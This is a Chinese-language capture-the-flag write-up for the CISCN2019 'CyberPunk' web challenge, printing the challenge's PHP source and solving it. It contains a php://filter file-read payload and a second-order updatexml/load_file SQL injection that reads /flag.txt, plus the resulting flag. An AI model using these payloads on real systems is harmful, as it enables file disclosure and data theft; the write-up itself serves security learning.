---
title: '[CISCN2019 华北赛区 Day1 Web5]CyberPunk'
date: 2024-06-08 17:09:21
tags: sql注入
categories: 刷题笔记
---

### [CISCN2019 华北赛区 Day1 Web5]CyberPunk（二次注入）

打开源码，发现关键信息

![image-20240604144920526](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406041449655.png)

我们可以使用filter伪协议读取index.php的内容

<!-- more -->

```
?file=php://filter/convert.base64-encode/resource=index.php
```

![image-20240604145000214](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406041450247.png)

得到base64编码

我们进行解码，得到index.php的代码

**index.php**

```
<?php

ini_set('open_basedir', '/var/www/html/');

// $file = $_GET["file"];
$file = (isset($_GET['file']) ? $_GET['file'] : null);
if (isset($file)){
    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {
        echo('no way!');
        exit;
    }
    @include($file);
}
?>
```

同理可得search.php，delete.php，change.php

**search.php**

```
<?php

require_once "config.php"; 

if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        if(!$row) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "<p>姓名:".$row['user_name']."</p><p>, 电话:".$row['phone']."</p><p>, 地址:".$row['address']."</p>";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

**delete.php**

```
<?php

require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $result = $db->query('delete from `user` where `user_id`=' . $row["user_id"]);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单删除成功";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

**change.php**

```
<?php

require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = addslashes($_POST["address"]);
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单修改成功";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

这几个文件源码都使用了关键词过滤，基本没有注入方法。然后

change.php中，只对`phone`和`user_name`进行了过滤，而对`address`只是使用`addslashes()`函数，可以使用报错注入。

**addslashes用法**

```
addslashes(string $string): string
```

返回需要在转义字符之前添加反斜线的字符串。这些字符是：

- 单引号（`'`）
- 双引号（`"`）
- 反斜线（`\`）
- NUL（NUL 字节）

注意change.php的sql语句

```
$sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#
```

首先我们提交订单，将地址改为注入语句

![image-20240604151106989](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406041511967.png)

我们再修改收货地址

![image-20240604151154256](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406041511569.png)

点击修改订单，得到部分flag，剩下的修改注入语句中的截取范围就能得到

![image-20240604151220635](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406041512665.png)

```
flag{9dc62f0c-6733-487f-99cf-ee2e42c5ce6b}
```
